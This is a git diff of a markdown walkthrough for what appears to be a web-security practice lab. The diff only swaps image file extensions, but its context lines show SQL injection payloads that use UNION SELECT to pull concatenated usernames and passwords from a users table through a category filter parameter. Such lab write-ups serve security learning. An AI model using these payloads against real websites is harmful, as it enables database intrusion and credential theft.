@@ -14,7 +14,7 @@ You can easily retrieve multiple values together within this single column by co
 
 step 1
 
-![screnshot](./images/lab6_lifestyle_category.png)
+![screnshot](images/lab6_lifestyle_category.jpg)
 
 
 step 2
@@ -25,7 +25,7 @@ URL Encoded
 1st payload
 `/filter?category=Lifestyle'+UNION+SELECT+username+||+'~'+||+password+FROM+users--`
 
-![screnshot](./images/lab6_internal_error.png)
+![screnshot](images/lab6_internal_error.jpg)
 
 step 3
 
@@ -34,7 +34,7 @@ step 3
 final payload
 `/filter?category=Lifestyle'+UNION+SELECT+NULL,username+||+'~'+||+password+FROM+users--`
 
-![screnshot](./images/lab6_administor_id_password.png)
+![screnshot](images/lab6_administor_id_password.jpg)
 
 step 4
 
@@ -50,4 +50,4 @@ step 4
 </tr>
 ```
 
-![screnshot](./images/lab6_solved_lab.png)
+![screnshot](images/lab6_solved_lab.jpg)
